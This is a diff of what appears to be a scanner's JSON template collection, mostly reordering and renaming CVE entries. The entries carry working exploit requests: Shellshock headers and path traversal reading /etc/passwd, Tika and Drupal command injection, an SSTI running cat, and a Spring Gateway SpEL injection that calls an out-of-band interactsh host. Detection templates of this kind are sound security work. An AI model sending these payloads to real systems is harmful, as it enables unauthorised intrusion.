@@ -3296,9 +3296,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5693,21 +5693,6 @@
       ]
     },
     {
-      "id": "CVE-2021-28377",
-      "info": {
-        "name": "ChronoForums 2.0.11 - Directory Traversal",
-        "severity": "high"
-      },
-      "requests": [
-        {
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd"
-          ]
-        }
-      ]
-    },
-    {
       "id": "CVE-2018-0127",
       "info": {
         "name": "Cisco RV132W and RV134W Router Information Disclosure",
@@ -5787,7 +5772,7 @@
     {
       "id": "CVE-2018-1000533",
       "info": {
-        "name": "GitList < 0.6.0 RCE",
+        "name": "GitList < 0.6.0 Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6204,11 +6189,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6686,7 +6671,7 @@
     {
       "id": "CVE-2018-18069",
       "info": {
-        "name": "Wordpress unauthenticated stored xss",
+        "name": "WordPress sitepress-multilingual-cms 3.6.3 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
@@ -7263,6 +7248,22 @@
             "GET /?q={{url_encode(\"{{userid}}\")}}%2Fcancel HTTP/1.1\nHost: {{Hostname}}\n",
             "POST /?q={{url_encode(\"{{userid}}\")}}%2Fcancel&destination={{url_encode(\"{{userid}}\")}}%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Decho+COP-2067-8102-EVC+|+rev HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_cancel_confirm_form&form_token={{form_token}}&_triggering_element_name=form_id&op=Cancel+account\n",
             "POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_build_id={{form_build_id}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-7662",
+      "info": {
+        "name": "CouchCMS Full Path Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/includes/mysql2i/mysql2i.func.php",
+            "{{BaseURL}}/addons/phpmailer/phpmailer.php"
           ]
         }
       ]
@@ -9241,7 +9242,7 @@
     {
       "id": "CVE-2020-10546",
       "info": {
-        "name": "rConfig 3.9.4 SQLi",
+        "name": "rConfig 3.9.4 SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9256,7 +9257,7 @@
     {
       "id": "CVE-2020-10547",
       "info": {
-        "name": "rConfig 3.9.4 SQLi",
+        "name": "rConfig 3.9.4 SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9271,7 +9272,7 @@
     {
       "id": "CVE-2020-10548",
       "info": {
-        "name": "rConfig 3.9.4 SQLi",
+        "name": "rConfig 3.9.4 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -11339,7 +11340,7 @@
     {
       "id": "CVE-2020-35848",
       "info": {
-        "name": "Cockpit prior to 0.12.0 NoSQL injection in /auth/newpassword",
+        "name": "Cockpit <0.12.0 NoSQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -11659,7 +11660,7 @@
     {
       "id": "CVE-2020-6637",
       "info": {
-        "name": "OpenSIS v7.3 unauthenticated SQL injection",
+        "name": "OpenSIS v7.3 unauthenticated SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -13935,6 +13936,21 @@
           "path": [
             "{{BaseURL}}/static?/%2557EB-INF/web.xml",
             "{{BaseURL}}/concat?/%2557EB-INF/web.xml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-28377",
+      "info": {
+        "name": "ChronoForums 2.0.11 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -16463,6 +16479,21 @@
             "POST /actuator/gateway/routes/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"predicates\": [\n    {\n      \"name\": \"Path\",\n      \"args\": {\n        \"_genkey_0\": \"/{{randstr}}/**\"\n      }\n    }\n  ],\n  \"filters\": [\n    {\n      \"name\": \"RewritePath\",\n      \"args\": {\n        \"_genkey_0\": \"#{T(java.net.InetAddress).getByName(\\\"{{interactsh-url}}\\\")}\",\n        \"_genkey_1\": \"/${path}\"\n      }\n    }\n  ],\n  \"uri\": \"{{RootURL}}\",\n  \"order\": 0\n}\n",
             "POST /actuator/gateway/refresh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"predicate\": \"Paths: [/{{randstr}}], match trailing slash: true\",\n  \"route_id\": \"{{randstr}}\",\n  \"filters\": [\n    \"[[RewritePath #{T(java.net.InetAddress).getByName(\\\"{{interactsh-url}}\\\")} = /${path}], order = 1]\"\n  ],\n  \"uri\": \"{{RootURL}}\",\n  \"order\": 0\n}\n",
             "DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-22954",
+      "info": {
+        "name": "VMware Workspace ONE Access - Freemarker SSTI",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d"
           ]
         }
       ]
